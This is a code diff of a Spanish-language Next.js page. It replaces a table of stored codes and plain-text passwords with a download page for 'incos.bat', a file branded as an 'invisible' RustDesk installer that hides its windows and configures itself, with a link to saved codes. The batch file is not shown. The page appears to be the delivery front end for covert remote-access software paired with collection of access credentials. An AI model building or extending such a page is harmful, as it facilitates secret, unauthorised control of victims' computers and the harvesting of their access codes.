@@ -1,162 +1,86 @@
 'use client'
 
-import { useState, useEffect } from 'react'
-
-interface Code {
-  id: number
-  code: string
-  password: string
-  created_at: string
-}
+import Link from 'next/link'
 
 export default function Home() {
-  const [codes, setCodes] = useState<Code[]>([])
-  const [newCode, setNewCode] = useState('')
-  const [newPassword, setNewPassword] = useState('')
-  const [loading, setLoading] = useState(false)
-
-  useEffect(() => {
-    fetchCodes()
-  }, [])
-
-  const fetchCodes = async () => {
-    try {
-      const response = await fetch('/api/codes')
-      const data = await response.json()
-      setCodes(data)
-    } catch (error) {
-      console.error('Error al obtener códigos:', error)
-    }
-  }
-
-  const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault()
-    setLoading(true)
-
-    try {
-      const response = await fetch('/api/codes', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          code: newCode,
-          password: newPassword,
-        }),
-      })
-
-      if (response.ok) {
-        setNewCode('')
-        setNewPassword('')
-        fetchCodes()
-      }
-    } catch (error) {
-      console.error('Error al agregar código:', error)
-    } finally {
-      setLoading(false)
-    }
+  const handleDownload = () => {
+    const link = document.createElement('a')
+    link.href = '/incos.bat'
+    link.download = 'incos.bat'
+    document.body.appendChild(link)
+    link.click()
+    document.body.removeChild(link)
   }
 
   return (
-    <div className="min-h-screen bg-gradient-to-br from-gray-100 to-gray-200 p-8">
-      <div className="max-w-4xl mx-auto">
-        <h1 className="text-4xl font-bold text-gray-800 mb-8 text-center">
-          Gestión de Códigos y Contraseñas
-        </h1>
-
-        {/* Formulario */}
-        <div className="bg-white rounded-lg shadow-lg p-6 mb-8">
-          <h2 className="text-2xl font-semibold text-gray-700 mb-4">
-            Agregar Nuevo Código
-          </h2>
-          <form onSubmit={handleSubmit} className="space-y-4">
-            <div>
-              <label htmlFor="code" className="block text-sm font-medium text-gray-700 mb-2">
-                Código
-              </label>
-              <input
-                type="text"
-                id="code"
-                value={newCode}
-                onChange={(e) => setNewCode(e.target.value)}
-                className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent text-gray-900"
-                required
-              />
+    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 flex items-center justify-center p-8">
+      <div className="max-w-2xl w-full">
+        <div className="bg-white rounded-2xl shadow-2xl p-12 text-center">
+          <div className="mb-8">
+            <div className="w-24 h-24 bg-gradient-to-br from-blue-500 to-indigo-600 rounded-full mx-auto flex items-center justify-center mb-6">
+              <svg className="w-12 h-12 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M9 19l3 3m0 0l3-3m-3 3V10" />
+              </svg>
             </div>
-            <div>
-              <label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-2">
-                Contraseña
-              </label>
-              <input
-                type="text"
-                id="password"
-                value={newPassword}
-                onChange={(e) => setNewPassword(e.target.value)}
-                className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent text-gray-900"
-                required
-              />
-            </div>
-            <button
-              type="submit"
-              disabled={loading}
-              className="w-full bg-blue-600 text-white py-2 px-4 rounded-lg hover:bg-blue-700 transition-colors disabled:bg-gray-400"
-            >
-              {loading ? 'Agregando...' : 'Agregar Código'}
-            </button>
-          </form>
-        </div>
-
-        {/* Tabla de códigos */}
-        <div className="bg-white rounded-lg shadow-lg overflow-hidden">
-          <h2 className="text-2xl font-semibold text-gray-700 p-6 bg-gray-50">
-            Lista de Códigos
-          </h2>
-          <div className="overflow-x-auto">
-            <table className="w-full">
-              <thead className="bg-gray-100">
-                <tr>
-                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
-                    ID
-                  </th>
-                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
-                    Código
-                  </th>
-                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
-                    Contraseña
-                  </th>
-                  <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
-                    Fecha de Creación
-                  </th>
-                </tr>
-              </thead>
-              <tbody className="bg-white divide-y divide-gray-200">
-                {codes.length === 0 ? (
-                  <tr>
-                    <td colSpan={4} className="px-6 py-4 text-center text-gray-500">
-                      No hay códigos registrados
-                    </td>
-                  </tr>
-                ) : (
-                  codes.map((code) => (
-                    <tr key={code.id} className="hover:bg-gray-50">
-                      <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
-                        {code.id}
-                      </td>
-                      <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900 font-medium">
-                        {code.code}
-                      </td>
-                      <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
-                        {code.password}
-                      </td>
-                      <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
-                        {new Date(code.created_at).toLocaleString('es-ES')}
-                      </td>
-                    </tr>
-                  ))
-                )}
-              </tbody>
-            </table>
+            <h1 className="text-4xl font-bold text-gray-800 mb-4">
+              Instalador RustDesk
+            </h1>
+            <p className="text-lg text-gray-600 mb-2">
+              Instalador Invisible
+            </p>
+            <p className="text-sm text-gray-500">
+              Sin software externo • 100% invisible
+            </p>
           </div>
+
+          <div className="bg-gray-50 rounded-lg p-6 mb-8">
+            <h2 className="text-xl font-semibold text-gray-700 mb-4">Características</h2>
+            <ul className="text-left space-y-2 text-gray-600">
+              <li className="flex items-center">
+                <svg className="w-5 h-5 text-green-500 mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
+                </svg>
+                Usa Windows API directamente
+              </li>
+              <li className="flex items-center">
+                <svg className="w-5 h-5 text-green-500 mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
+                </svg>
+                No requiere software externo
+              </li>
+              <li className="flex items-center">
+                <svg className="w-5 h-5 text-green-500 mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
+                </svg>
+                Ventanas ocultas en 0.5 segundos
+              </li>
+              <li className="flex items-center">
+                <svg className="w-5 h-5 text-green-500 mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
+                </svg>
+                Configuración automática
+              </li>
+            </ul>
+          </div>
+
+          <button
+            onClick={handleDownload}
+            className="w-full bg-gradient-to-r from-blue-600 to-indigo-600 text-white py-4 px-8 rounded-lg text-lg font-semibold hover:from-blue-700 hover:to-indigo-700 transition-all transform hover:scale-105 shadow-lg mb-6"
+          >
+            <div className="flex items-center justify-center">
+              <svg className="w-6 h-6 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
+              </svg>
+              Descargar Instalador
+            </div>
+          </button>
+
+          <Link
+            href="/codes"
+            className="inline-block text-blue-600 hover:text-blue-700 font-medium"
+          >
+            Ver códigos guardados →
+          </Link>
         </div>
       </div>
     </div>
